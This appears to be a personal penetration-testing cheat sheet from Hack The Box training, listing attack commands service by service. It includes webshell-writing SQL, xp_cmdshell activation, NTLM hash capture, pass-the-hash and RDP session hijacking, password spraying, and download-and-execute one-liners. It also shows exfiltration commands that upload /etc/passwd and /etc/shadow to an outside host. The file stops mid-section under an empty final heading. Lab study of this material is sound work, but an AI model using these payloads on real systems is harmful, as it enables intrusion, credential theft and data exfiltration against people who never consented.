# HTB – Penetration Testing Notes

Author: James Saltmer  
Purpose: Consolidated HTB pentesting notes with duplicated commands grouped by workflow.

---

## 0. Quick Scanning (Nmap)

### Full TCP scan (default scripts + version detection)
```bash
nmap -sC -sV -p- --min-rate 1000 10.129.106.147 > nmap1.txt
```

### Common UDP scan (curated ports)
```bash
nmap -sU -sV -sC -p U:53,67,68,69,123,161,162,514,1194,1434,1900 10.129.106.147 > nmap2.txt
```

---

## 1. Initial Setup & Utilities

### Add domain to `/etc/hosts`
```bash
sudo sh -c "echo '94.237.51.125 inlanefreight.htb' >> /etc/hosts"
```

### Create self-signed certificate (single PEM containing key+cert)
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

### Python – extract ZIP without `unzip`
```python
import zipfile

with zipfile.ZipFile('test.zip', "r") as z:
    z.extractall("/home/user/directory")
```

---

## 2. Passive Recon / OSINT

- `crt.sh` / `search.censys.io` → SSL Certificates log  
- `Domain.Glass` → Infrastructure  
- `buckets.grayhatwarfare.com` → Cloud buckets  
- `web.archive.org` → Web archives  
- `github.com/EdOverflow/can-i-take-over-xyz` → Domain Takeover Repo
### crt.sh JSON
```bash
curl -s "https://crt.sh/?q=foo.com&output=json" | jq .
```

### crt.sh → extract unique names
```bash
curl -s "https://crt.sh/?q=foo.com&output=json" \
| jq . \
| grep name \
| cut -d":" -f2 \
| grep -v "CN=" \
| cut -d'"' -f2 \
| awk '{gsub(/\\n/,"\n");}1;' \
| sort -u
```

### Resolve subdomains → IPs
```bash
for i in $(cat subdomainlist); do
  host "$i" | grep "has address" | grep foo.com | cut -d" " -f1,4
done
```

### Save IPs to file
```bash
for i in $(cat subdomainlist); do
  host "$i" | grep "has address" | grep foo.com | cut -d" " -f4 >> ip-addresses.txt
done
```

### Shodan lookup for each IP
```bash
for i in $(cat ip-addresses.txt); do
  shodan host "$i"
done
```

### DNS quick checks
```bash
dig any foo.com
```

### Google “dorks” for cloud artifacts
- AWS: `intext:foo inurl:amazonaws.com`
- Azure: `intext:foo inurl:blob.core.windows.net`

---

## 3. Google Operators Cheat Sheet

| Operator | Description | Example | Example Description |
|---|---|---|---|
| `site:` | Limits results to a site/domain | `site:example.com` | All publicly accessible pages on example.com |
| `inurl:` | Term in the URL | `inurl:login` | Search for login pages |
| `filetype:` | File type search | `filetype:pdf` | Find PDFs |
| `intitle:` | Term in title | `intitle:"confidential report"` | Find pages with that title |
| `intext:` / `inbody:` | Term in body text | `intext:"password reset"` | Pages containing phrase |
| `cache:` | Cached version | `cache:example.com` | View cached content |
| `link:` | Pages linking to URL | `link:example.com` | Find backlinks |
| `related:` | Similar sites | `related:example.com` | Similar websites |
| `info:` | Summary info | `info:example.com` | Basic details |
| `define:` | Definitions | `define:phishing` | Definitions |
| `numrange:` | Numbers in range | `site:example.com numrange:1000-2000` | Pages containing numbers 1000–2000 |
| `allintext:` | All words in body | `allintext:admin password reset` | Both terms in body |
| `allinurl:` | All words in URL | `allinurl:admin panel` | Both terms in URL |
| `allintitle:` | All words in title | `allintitle:confidential report 2023` | Words in title |
| `AND` | Requires all terms | `site:example.com AND (inurl:admin OR inurl:login)` | Narrow results |
| `OR` | Any of terms | `"linux" OR "ubuntu" OR "debian"` | Broader search |
| `NOT` | Exclude terms | `site:bank.com NOT inurl:login` | Exclude login pages |
| `*` | Wildcard | `site:socialnetwork.com filetype:pdf user* manual` | user guide/handbook/manual |
| `..` | Numeric range | `site:ecommerce.com "price" 100..500` | Price 100–500 |
| `""` | Exact phrase | `"information security policy"` | Exact phrase |
| `-` | Exclude terms | `site:news.com -inurl:sports` | Exclude sports |

### Common Google Dorks

**Finding login pages**
```text
site:example.com inurl:login
site:example.com (inurl:login OR inurl:admin)
```

**Exposed files**
```text
site:example.com filetype:pdf
site:example.com (filetype:xls OR filetype:docx)
```

**Config files**
```text
site:example.com inurl:config.php
site:example.com (ext:conf OR ext:cnf)
```

**Backups / DB dumps**
```text
site:example.com inurl:backup
site:example.com filetype:sql
```

---

## 4. FTP

### Config / access control
```bash
cat /etc/vsftpd.conf | grep -v "#"
cat /etc/ftpusers
```

### FTP client
```bash
ftp username:password@my.domain.com
```
Common commands:
```text
status
ls
ls -R
get foo.txt
put foo.txt
```

### Mirror download (anonymous)
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

### Raw interaction
```bash
nc -nv 10.129.14.136 21
telnet 10.129.14.136 21
```

### FTP over TLS
```bash
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

---

## 5. SMB / Samba

### Config
```bash
cat /etc/samba/smb.conf | grep -v "#\|\;"
```

### Enumerate shares / connect
```bash
# Display a list of shares
smbclient -N -L //10.129.14.128
# Or:
smbmap -H 10.129.14.128

# List contents of directory
smbclient //10.129.14.128/foo
# Or:
smbmap -H 10.129.14.128 -r notes
```

### Donwload files
```bash
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

### Upload Files
```bash
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

Linux - Mount
```bash
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance

# Search for files with a name conataining cred
find /mnt/Finance/ -name *cred*

# Search for files with a name conataining cred
grep -rn /mnt/Finance/ -ie cred
```
SMB client commands:
```text
help
ls
get foo.txt
```

For Windows CMD:
```bat
rem List files/folders in a share
dir \\192.168.220.129\Finance\

rem Connect to a shared resource
net use n: \\192.168.220.129\Finance

rem Count how many files are in a share
dir n: /a-d /s /b | find /c ":\"

rem Search for files with a name conataining cred
dir n:\*cred* /s /b

rem Search for fles containing a specific word
findstr /s /i cred n:\*.*
```

For Windows Powershell:
```powershell
# List files/folders in a share
Get-ChildItem \\192.168.220.129\Finance\

# Connect to a share
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

# Authenticate and connect to a share
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
 New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

 # Count how many files are in a share
(Get-ChildItem -File -Recurse | Measure-Object).Count

# Search for files with a name conataining cred
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

# Search for fles containing a specific word
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```
### Service footprinting
```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

### rpcclient enumeration
```bash
rpcclient -U "" 10.129.14.128
```

Common rpcclient commands:
```text
srvinfo
enumdomains
querydominfo
netshareenumall
netsharegetinfo foo
enumdomusers
queryuser <RID>
```

### RID bruteforce loop
```bash
for i in $(seq 500 1100); do
  rpcclient -N -U "" 10.129.14.128 \
    -c "queryuser 0x$(printf '%x\n' $i)" \
  | grep "User Name\|user_rid\|group_rid" && echo ""
done
```

### Tools
```bash
impacket-psexec administrator:'Password123!'@10.10.110.17

samrdump.py 10.129.14.128

smbmap -H 10.129.14.128

crackmapexec smb 10.129.14.128 --shares -u '' -p '' # Use --local-auth for non-domain joined computer

# For RCE
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec 

./enum4linux-ng.py 10.129.14.128 -A

# Capture hashes from name resolution fails. Stored in /usr/share/responder/logs/
responder -I <interface name>
```

---

## 6. NFS

### Footprinting
```bash
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

### List exports
```bash
showmount -e 10.129.14.128
```

### Mount share
```bash
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
```

### Listing with names vs IDs
```bash
ls -l mnt/nfs/
ls -n mnt/nfs/
```

---

## 7. DNS

### Record types (high-level)
- **A** → IPv4 address  
- **AAAA** → IPv6 address  
- **MX** → mail servers  
- **NS** → nameservers  
- **TXT** → arbitrary text (SPF/DMARC/verification)  
- **CNAME** → alias to another name  
- **PTR** → reverse (IP → name)  
- **SOA** → zone authority + admin contact  

### Footprinting / common commands
```bash
dig ns inlanefreight.htb @10.129.14.128
dig CH TXT version.bind 10.129.120.85
dig any inlanefreight.htb @10.129.14.128
dig axfr inlanefreight.htb @10.129.14.128
dig axfr internal.inlanefreight.htb @10.129.14.128
```

### `dig` quick reference
```bash
dig domain.com
dig domain.com A
dig domain.com AAAA
dig domain.com MX
dig domain.com NS
dig domain.com TXT
dig domain.com CNAME
dig domain.com SOA
dig @1.1.1.1 domain.com
dig +trace domain.com
dig -x 192.168.1.1
dig +short domain.com
dig +noall +answer domain.com
dig domain.com ANY
```

### Subdomain brute forcing (wordlist + `dig`)
```bash
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do
  dig "$sub.inlanefreight.htb" @10.129.14.128 \
  | grep -v ';\|SOA' \
  | sed -r '/^\s*$/d' \
  | grep "$sub" \
  | tee -a subdomains.txt
done
```

### Subdomain Enumeration
```bash
./subfinder -d inlanefreight.com -v   
```

### dnsenum brute forcing
```bash
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 \
  -o subdomains.txt \
  -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  inlanefreight.htb

dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

### Sub Domain bruteforcing with self defined resolvers
```bash
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

### Scan For DNS Zone Transfers with Fierce
```bash
fierce --domain zonetransfer.me
```
### DNS tools list
- dig
- nslookup
- host
- dnsenum
- fierce
- dnsrecon
- theHarvester
- subfinder
-  subbrute

---

## 8. SMTP

### Config
```bash
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

### SMTP commands (overview)
- `AUTH PLAIN` → authenticate client
- `HELO` → introduce client hostname
- `MAIL FROM` → sender
- `RCPT TO` → recipient
- `DATA` → message body
- `RSET` → reset transaction
- `VRFY` → verify mailbox
- `EXPN` → expand mailing list
- `NOOP` → keepalive
- `QUIT` → end session
-

### Interact
```bash
telnet 10.129.14.128 25
```
```
11 login "marlin@inlanefreight.htb" "poohbear"
```

### Through a web proxy
```text
CONNECT 10.129.14.128:25 HTTP/1.0
```

### Open relay risk example
```text
mynetworks = 0.0.0.0/0
```

### Footprinting
```bash
sudo nmap 10.129.14.128 -sC -sV -p25
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

### User enumeration
```bash
wget https://academy.hackthebox.com/storage/resources/Footprinting-wordlist.zip
unzip Footprinting-wordlist.zip

smtp-user-enum -M VRFY -U ./footprinting-wordlist.txt -D inlanefreight.htb -t 10.129.181.79 -m 60 -w 20
```

---

## 9. IMAP / POP3

### IMAP commands
```text
1 LOGIN username password
1 LIST "" *
1 CREATE "INBOX"
1 DELETE "INBOX"
1 RENAME "ToRead" "Important"
1 LSUB "" *
1 SELECT INBOX
1 UNSELECT INBOX
1 FETCH <ID> all
1 FETCH 1 (Body[])
1 CLOSE
1 LOGOUT
```

### POP3 commands
```text
USER username
PASS password
STAT
LIST
RETR id
DELE id
CAPA
RSET
QUIT
```

### “Dangerous” Dovecot-ish settings
- `auth_debug`
- `auth_debug_passwords`
- `auth_verbose`
- `auth_verbose_passwords`
- `auth_anonymous_username`

### Footprinting
```bash
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```

### Auth / banners with curl
```bash
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
```

### OpenSSL interaction
```bash
openssl s_client -connect 10.129.14.128:pop3s
openssl s_client -connect 10.129.14.128:imaps
```

### O365 Spray for Target Domains using Office 365
Check if domain is using O365
```bash
python3 o365spray.py --validate --domain msplaintext.xyz
```

Enumerate Usernames
```bash
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz 
```
Password Spraying
```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
---



## 10. SNMP

### Config
```bash
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

### Dangerous settings
- `rwuser noauth`
- `rwcommunity <community> <IPv4>`
- `rwcommunity6 <community> <IPv6>`

### Walk
```bash
snmpwalk -v2c -c public 10.129.14.128
```

### Community bruteforce
```bash
sudo apt install onesixtyone
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

### braa
```bash
sudo apt install braa
braa public@10.129.14.128:.1.3.6.*
```

---

## 11. MySQL

### Config
```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

### Dangerous settings
- `user`
- `password`
- `admin_address`
- `debug`
- `sql_warnings`
- `secure_file_priv`

### Enumeration
```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

### Client interaction
```bash
mysql -u <user> -h 10.129.14.132
mysql -u <user> -p<password> -h 10.129.14.128
```

### Write to Local File
```sql
-- PHP Webshell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

### Read Local File
```sql
select LOAD_FILE("/etc/passwd");
```

### MySQL quick commands
```sql
show databases;
use <database>;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <column> = "<string>";
```

---

## 12. MSSQL

### Nmap enumeration (example)
```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
  -sV -p 1433 10.129.201.248
```

### Metasploit mssql_ping
```text
msf6 > use auxiliary(scanner/mssql/mssql_ping)
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```

### Connect with Impacket
```bash
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

### Connect with SQSH
Linux Bash
```bash
sqsh -S 10.129.20.13 -U username -P Password123
```

### Connect with SQLCMD
Windows Cmd
```bat
sqlcmd -S 10.129.20.13 -U username -P Password123

REM auth with Windows Authentication
SQLCMD.EXE -S WIN-HARD
```

### xp_cmdshell

Execute command
```sql
1> xp_cmdshell 'whoami'
2> GO
```

Enable xp_cmdshell
```sql
EXECUTE sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO 

EXECUTE sp_configure 'xp_cmdshell', 1
GO

RECONFIGURE
GO
```

### Write to Files

Enable Ole Automation Procedures
```sql
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

Create a File
```sql
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Read Local Files
```sql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

### Capture MSSQL Service Hash
Start Respondor Or Impacket-smbserver
```bash  
sudo responder -I tun0

# Or impacket-smbserver
sudo impacket-smbserver share ./ -smb2support
```
XP_DIRTREE Hash Stealing
```sql
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

XP_SUBDIRS Hash Stealing
```sql
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### Impersonating Other Users
Identify Users to Impersonate
```sql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

Verifying our Current User and Role
```sql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

Impersonating User (sa)
```sql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

### Communicate with Other Databases with MSSQL
Identify linked Servers in MSSQL
```sql
1> SELECT srvname, isremote FROM sysservers
2> GO
```

Identify User and Privileges used for connection
```sql
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

Example Usage
```sql
EXECUTE AS LOGIN = 'john'
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE; EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXECUTE xp_cmdshell ''type C:\\Users\Administrator\Desktop\flag.txt'';') AT [LOCAL.TEST.LINKED.SRV]
```
---

## 13. Oracle TNS

### Key config files
```text
$ORACLE_HOME/network/admin/tnsnames.ora
$ORACLE_HOME/network/admin/listener.ora
```

### Install instantclient + ODAT (example sequence)
```bash
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc

cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

### ODAT help
```bash
./odat.py -h
```

### Enumerate / brute SID
```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
./odat.py all -s 10.129.204.235
```

### Connect
```bash
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

### Extract hashes (sysdba)
```sql
select name, password from sys.user$;
```

### File upload test (UTL_FILE)
```bash
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://10.129.204.235/testing.txt
```

### Fix `libsqlplus.so` error
```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

---

## 14. IPMI

### Nmap
```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

### Metasploit version scan
```text
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
```

### Default passwords
| Product | Username | Password |
|---|---|---|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomized 8-char (numbers + uppercase) |
| Supermicro IPMI | ADMIN | ADMIN |

### Crack hashes (hashcat mask example)
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

### Dump hashes (Metasploit)
```text
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
```

---

## 15. SSH / R-Services / RDP / WinRM

### “Dangerous” SSH settings
- `PasswordAuthentication yes`
- `PermitEmptyPasswords yes`
- `PermitRootLogin yes`
- `Protocol 1`
- `X11Forwarding yes`
- `AllowTcpForwarding yes`
- `PermitTunnel`
- `DebianBanner yes`

### ssh-audit
```bash
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py 10.129.14.132
```

### SSH usage
```bash
ssh -v cry0l1t3@10.129.14.132
ssh -i private.key <user>@<FQDN/IP>
# To fix bad permissions
chmod 600 id_rsa
```

### rsync footprinting
```bash
sudo nmap -sV -p 873 127.0.0.1
nc -nv 127.0.0.1 873
rsync -av --list-only rsync://127.0.0.1/dev
```

### Trusted hosts
```bash
cat /etc/hosts.equiv
```

### R-services
```bash
sudo nmap -sV -p 512,513,514 10.0.17.2
rlogin 10.0.17.2 -l htb-student
rwho
rusers -al 10.0.17.5
```

### RDP footprinting + tools
```bash
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
sudo cpan
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl 10.129.201.248
```

### RDP connect
```bash
xfreerdp /u:cry0l1t3 /p:'P455w0rd!' /v:10.129.201.248
```

### RDP Pass the Hash (PtH)
Adding the DisableRestrictedAdmin Registry Key
```bat
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

PtH with xfreerdp
```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

### RDP Session Hijacking
Find Active User Sessions
```bash
query user
```
With System privileges
```bat
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

With Local Administrator Privileges
```bat
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

net start sessionhijack
```
### WinRM footprinting + connect
```bash
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```

---

## 16. Web Enumeration

### WHOIS
```bash
whois inlanefreight.com
```

### Virtual host discovery
```bash
gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain
gobuster vhost -u http://inlanefreight.htb:80 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

### Banner grabbing
```bash
curl -I https://inlanefreight.com
```

### Detect WAF
```bash
pip3 install git+https://github.com/EnableSecurity/wafw00f
wafw00f inlanefreight.com
```

### Nikto
```bash
sudo apt update && sudo apt install -y perl
git clone https://github.com/sullo/nikto
cd nikto/program
chmod +x ./nikto.pl
nikto -h inlanefreight.com -Tuning b
```

### CMS discovery
```bash
curl -s http://app.inlanefreight.local/index.php | grep '<meta name="generator"'
```

### Well-known URIs (examples)
| URI | Description | Status | Reference |
|---|---|---:|---|
| `security.txt` | Contact info for vuln reports | Permanent | RFC 9116 |
| `/.well-known/change-password` | Standard change-password URL | Provisional | W3C draft |
| `openid-configuration` | OIDC discovery endpoint | Permanent | OpenID spec |
| `assetlinks.json` | Digital Asset Links ownership | Permanent | Google DAL |
| `mta-sts.txt` | SMTP MTA-STS policy | Permanent | RFC 8461 |

### ReconSpider
```bash
pip3 install scrapy
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
python3 ReconSpider.py http://inlanefreight.com
```

ReconSpider JSON output keys:
- `emails`, `links`, `external_files`, `js_files`, `form_fields`, `images`, `videos`, `audio`, `comments`

### FinalRecon
```bash
git clone https://github.com/thewhiteh4t/FinalRecon.git
cd FinalRecon
pip3 install -r requirements.txt
chmod +x ./finalrecon.py
./finalrecon.py --help
./finalrecon.py --headers --whois --url http://inlanefreight.com
```

FinalRecon options (summary):
- `--headers`, `--sslinfo`, `--whois`, `--crawl`, `--dns`, `--sub`, `--dir`, `--wayback`, `--ps`, `--full`

---

## 17. Hashing / Base64 / File transfer

### Linux
```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
echo -n '...' | base64 -d > id_rsa
```

### Windows
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("..."))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### PowerShell downloads
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
Invoke-WebRequest <url> -OutFile <file>
curl.exe --output index.html --url https://superuser.com
```

### SMB server (Impacket)
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Windows copy from SMB:
```text
copy \\192.168.220.133\share\nc.exe
```

### FTP server (pyftpdlib)
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

PowerShell FTP download:
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

### Windows built-in `ftp.exe` with script file
```text
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### uploadserver (Python HTTP upload)
```bash
pip3 install uploadserver
python3 -m uploadserver
```

PowerShell upload script (PSUpload):
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

PowerShell base64 upload:
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

### Raw TCP HTTP (Linux)
```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
cat <&3
```

### SSH server enable/start
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

### SCP
```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

### HTTPS uploadserver with self-signed cert
```bash
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Upload multiple files:
```bash
curl -X POST https://192.168.49.128/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow' \
  --insecure
```

### Quick servers
```bash
python3 -m http.server
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

### Python download one-liner
```python
import urllib.request as request
request.urlretrieve("http://STMIP/flag.txt", "flag.txt")
```

### Download with Python 2/3, PHP, Ruby, Perl, JS, VBScript (one-liners)

Python 2:
```bash
python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","LinEnum.sh")'
```

Python 3:
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","LinEnum.sh")'
```

PHP (save file):
```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

PHP (stream):
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","rb"); $flocal = fopen("LinEnum.sh","wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

PHP (pipe to bash):
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

Ruby:
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

Perl:
```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

JScript (wget.js):
```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Run JScript:
```text
cscript.exe /nologo wget.js <url> <outfile>
```

VBScript (wget.vbs):
```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Run VBScript:
```text
cscript.exe /nologo wget.vbs <url> <outfile>
```

### Upload with Python requests one-liner
```bash
